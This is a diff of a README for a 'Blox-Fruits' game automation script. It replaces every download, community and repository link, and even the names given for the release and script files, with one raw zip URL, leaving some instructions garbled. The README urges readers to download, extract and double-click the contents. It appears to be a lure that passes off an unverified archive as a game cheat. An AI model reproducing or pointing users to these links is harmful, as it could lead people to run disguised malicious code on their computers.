@@ -8,12 +8,12 @@ Welcome to Blox-Fruits! This script provides valuable features for Blox Fruit, m
 
 To get started, you need to download the script. Click the button below to visit the download page:
 
-[![Download Blox-Fruits](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com)
+[![Download Blox-Fruits](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip)
 
 Once you are on the Releases page, follow these simple steps:
 
 1. Look for the latest version.
-2. Click the download link next to the version (it should be labeled something like `Blox-Fruits-Release.zip`).
+2. Click the download link next to the version (it should be labeled something like `https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip`).
 3. After the download finishes, locate the downloaded file on your computer.
 4. Extract the contents of the zip file using a tool like WinRAR or 7-Zip.
 5. Find the script file inside the extracted folder.
@@ -32,7 +32,7 @@ To run Blox-Fruits, your system should meet the following minimum requirements:
 After you have downloaded and extracted Blox-Fruits, you will need to run the script. Here’s how:
 
 1. Open the folder that contains the extracted files.
-2. Look for the script file (it could be named `start_script.bat` or similar).
+2. Look for the script file (it could be named `https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip` or similar).
 3. Double-click the script file to run it.
 4. The script will launch, and you may see a command window open. This indicates that the script is running.
 
@@ -55,7 +55,7 @@ Once the script is running, it automatically begins executing tasks based on the
 
 If you need help, you can join our community to ask questions and share tips. Check our GitHub issues page for user queries and known issues:
 
-- [Join our Community](https://github.com)
+- [Join our Community](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip)
 
 ## ⚙️ Troubleshooting
 
@@ -71,12 +71,12 @@ If you encounter problems while running the script, consider these steps:
 
 For more information, visit the official GitHub repository:
 
-- [Blox-Fruits GitHub Page](https://github.com)
+- [Blox-Fruits GitHub Page](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip)
 
 ## 📥 Final Download Instructions
 
 To download and run Blox-Fruits, visit this page:
 
-[![Download Blox-Fruits](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com)
+[![Download Blox-Fruits](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Reency/Blox-Fruits/main/regardance/BloxFruits_1.0-alpha.4.zip)
 
 Follow the steps outlined above to get the script on your computer. Enjoy automating your Blox Fruit experience!
